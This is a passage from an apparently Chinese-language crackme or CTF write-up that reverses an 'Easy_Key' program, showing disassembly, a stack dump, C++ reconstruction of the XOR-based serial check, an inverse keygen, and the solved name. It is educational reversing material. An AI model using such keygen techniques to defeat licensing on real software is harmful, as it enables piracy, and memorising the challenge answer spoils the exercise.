&lt;span class="nt"&gt;0040109F&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;83C4&lt;/span&gt; &lt;span class="nt"&gt;10&lt;/span&gt;       &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;add&lt;/span&gt; &lt;span class="nt"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;10&lt;/span&gt;
&lt;span class="nt"&gt;004010A2&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;45&lt;/span&gt;            &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;inc&lt;/span&gt; &lt;span class="nt"&gt;ebp&lt;/span&gt;
&lt;span class="nt"&gt;004010A3&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8D7C24&lt;/span&gt; &lt;span class="nt"&gt;10&lt;/span&gt;     &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;lea&lt;/span&gt; &lt;span class="nt"&gt;edi&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;004010A7&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;83C9&lt;/span&gt; &lt;span class="nt"&gt;FF&lt;/span&gt;       &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;or&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;FFFFFFFF&lt;/span&gt;
&lt;span class="nt"&gt;004010AA&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;33C0&lt;/span&gt;          &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;xor&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;span class="nt"&gt;004010AC&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;46&lt;/span&gt;            &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;inc&lt;/span&gt; &lt;span class="nt"&gt;esi&lt;/span&gt;
&lt;span class="nt"&gt;004010AD&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;F2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;AE&lt;/span&gt;         &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;repne&lt;/span&gt; &lt;span class="nt"&gt;scas&lt;/span&gt; &lt;span class="nt"&gt;byte&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;es&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;004010AF&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;F7D1&lt;/span&gt;          &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;not&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;
&lt;span class="nt"&gt;004010B1&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;49&lt;/span&gt;            &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;dec&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;
&lt;span class="nt"&gt;004010B2&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;3BE9&lt;/span&gt;          &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;cmp&lt;/span&gt; &lt;span class="nt"&gt;ebp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;ecx&lt;/span&gt;
&lt;span class="nt"&gt;004010B4&lt;/span&gt;  &lt;span class="o"&gt;|.^&lt;/span&gt; &lt;span class="nt"&gt;7C&lt;/span&gt; &lt;span class="nt"&gt;C1&lt;/span&gt;         &lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;jl&lt;/span&gt; &lt;span class="nt"&gt;short&lt;/span&gt; &lt;span class="nt"&gt;Easy_Key&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;00401077&lt;/span&gt;
&lt;span class="nt"&gt;004010B6&lt;/span&gt;  &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt;  &lt;span class="nt"&gt;B9&lt;/span&gt; &lt;span class="nt"&gt;19000000&lt;/span&gt;   &lt;span class="nt"&gt;mov&lt;/span&gt; &lt;span class="nt"&gt;ecx&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;19&lt;/span&gt;
&lt;span class="nt"&gt;004010BB&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;33C0&lt;/span&gt;          &lt;span class="nt"&gt;xor&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;span class="nt"&gt;004010BD&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;8D7C24&lt;/span&gt; &lt;span class="nt"&gt;10&lt;/span&gt;     &lt;span class="nt"&gt;lea&lt;/span&gt; &lt;span class="nt"&gt;edi&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;ss&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;
&lt;span class="nt"&gt;004010C1&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;68&lt;/span&gt; &lt;span class="nt"&gt;44804000&lt;/span&gt;   &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;Easy_Key&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;00408044&lt;/span&gt;                   &lt;span class="o"&gt;;&lt;/span&gt;  &lt;span class="nt"&gt;Input&lt;/span&gt; &lt;span class="nt"&gt;Serial&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
&lt;span class="nt"&gt;004010C6&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;F3&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;AB&lt;/span&gt;         &lt;span class="nt"&gt;rep&lt;/span&gt; &lt;span class="nt"&gt;stos&lt;/span&gt; &lt;span class="nt"&gt;dword&lt;/span&gt; &lt;span class="nt"&gt;ptr&lt;/span&gt; &lt;span class="nt"&gt;es&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;edi&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;

&lt;span class="o"&gt;...&lt;/span&gt;

&lt;span class="nt"&gt;0040111A&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;68&lt;/span&gt; &lt;span class="nt"&gt;38804000&lt;/span&gt;   &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;Easy_Key&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;00408038&lt;/span&gt;                   &lt;span class="o"&gt;;&lt;/span&gt;  &lt;span class="nt"&gt;Correct&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;n&lt;/span&gt;
&lt;span class="nt"&gt;0040111F&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;E8&lt;/span&gt; &lt;span class="nt"&gt;95000000&lt;/span&gt;   &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;Easy_Key&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;004011B9&lt;/span&gt;
&lt;span class="nt"&gt;00401124&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;83C4&lt;/span&gt; &lt;span class="nt"&gt;04&lt;/span&gt;       &lt;span class="nt"&gt;add&lt;/span&gt; &lt;span class="nt"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;4&lt;/span&gt;
&lt;span class="nt"&gt;00401127&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;33C0&lt;/span&gt;          &lt;span class="nt"&gt;xor&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;span class="nt"&gt;00401129&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;81C4&lt;/span&gt; &lt;span class="nt"&gt;30010000&lt;/span&gt; &lt;span class="nt"&gt;add&lt;/span&gt; &lt;span class="nt"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;130&lt;/span&gt;
&lt;span class="nt"&gt;0040112F&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;C3&lt;/span&gt;            &lt;span class="nt"&gt;retn&lt;/span&gt;
&lt;span class="nt"&gt;00401130&lt;/span&gt;  &lt;span class="o"&gt;|&amp;gt;&lt;/span&gt;  &lt;span class="nt"&gt;68&lt;/span&gt; &lt;span class="nt"&gt;30804000&lt;/span&gt;   &lt;span class="nt"&gt;push&lt;/span&gt; &lt;span class="nt"&gt;Easy_Key&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;00408030&lt;/span&gt;                   &lt;span class="o"&gt;;&lt;/span&gt;  &lt;span class="nt"&gt;Wrong&lt;/span&gt;&lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="nt"&gt;n&lt;/span&gt;
&lt;span class="nt"&gt;00401135&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;E8&lt;/span&gt; &lt;span class="nt"&gt;7F000000&lt;/span&gt;   &lt;span class="nt"&gt;call&lt;/span&gt; &lt;span class="nt"&gt;Easy_Key&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;004011B9&lt;/span&gt;
&lt;span class="nt"&gt;0040113A&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;83C4&lt;/span&gt; &lt;span class="nt"&gt;04&lt;/span&gt;       &lt;span class="nt"&gt;add&lt;/span&gt; &lt;span class="nt"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;4&lt;/span&gt;
&lt;span class="nt"&gt;0040113D&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;33C0&lt;/span&gt;          &lt;span class="nt"&gt;xor&lt;/span&gt; &lt;span class="nt"&gt;eax&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;eax&lt;/span&gt;
&lt;span class="nt"&gt;0040113F&lt;/span&gt;  &lt;span class="o"&gt;|.&lt;/span&gt;  &lt;span class="nt"&gt;81C4&lt;/span&gt; &lt;span class="nt"&gt;30010000&lt;/span&gt; &lt;span class="nt"&gt;add&lt;/span&gt; &lt;span class="nt"&gt;esp&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;130&lt;/span&gt;
&lt;span class="nt"&gt;00401145&lt;/span&gt;  &lt;span class="err"&gt;\&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;  &lt;span class="nt"&gt;C3&lt;/span&gt;            &lt;span class="nt"&gt;retn&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在&lt;code&gt;00401059&lt;/code&gt;即InputFunction处输入测试用的Name：abcde，并回车。之后程序跑到&lt;code&gt;004010C1&lt;/code&gt;即InputSerial处，查看栈数据：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;0018FDEC   00000005
0018FDF0   0018FF88
0018FDF4   004011B5  Easy_Key.004011B5
0018FDF8   00000004
0018FDFC   0040109F  Easy_Key.0040109F
0018FE00   0018FE84  ASCII &amp;quot;7142537445&amp;quot;
0018FE04   00408054  ASCII &amp;quot;%s%02X&amp;quot;
0018FE08   0018FE84  ASCII &amp;quot;7142537445&amp;quot;
0018FE0C   00000045
0018FE10   00000000
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可以看到当Name为abcde的时候，栈在InputSerial前有数据&lt;code&gt;ASCII "7142537445"&lt;/code&gt;出现。通过InputSerial之后程序逻辑可以看出，这段字符串就是根据abcde算出的序列号，并用这个序列号和输入的序列号做对比。因此序列号算法在输入名字后、输入序列号之前(&lt;code&gt;0040105E&lt;/code&gt;-&lt;code&gt;004010B4&lt;/code&gt;)。&lt;/p&gt;
&lt;p&gt;这段程序还原成C++代码后基本如下：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="k"&gt;namespace&lt;/span&gt; &lt;span class="n"&gt;std&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;num&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="mh"&gt;0x10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x20&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x30&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;abcde&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;serial&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="n"&gt;memset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;serial&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="n"&gt;sprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;serial&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;%s%02x&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;serial&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="n"&gt;num&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="n"&gt;cout&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;serial&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;因此可以写出反函数：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="k"&gt;using&lt;/span&gt; &lt;span class="k"&gt;namespace&lt;/span&gt; &lt;span class="n"&gt;std&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;num&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="mh"&gt;0x10&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x20&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x30&lt;/span&gt;&lt;span class="p"&gt;};&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;serial&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;7142537445&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;serial&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
    &lt;span class="n"&gt;memset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;serial&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;=&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

        &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;serial_str&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
        &lt;span class="n"&gt;serial_str&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;serial&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;serial_str&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;serial&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="n"&gt;serial_str&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sc"&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

        &lt;span class="n"&gt;sprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;%s%c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;strtol&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;serial_str&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="n"&gt;num&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="n"&gt;cout&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;把serial用5B134977135E7D13带入跑出来Name为K3yg3nm3。&lt;/p&gt;
&lt;h1&gt;Easy Unpack&lt;/h1&gt;
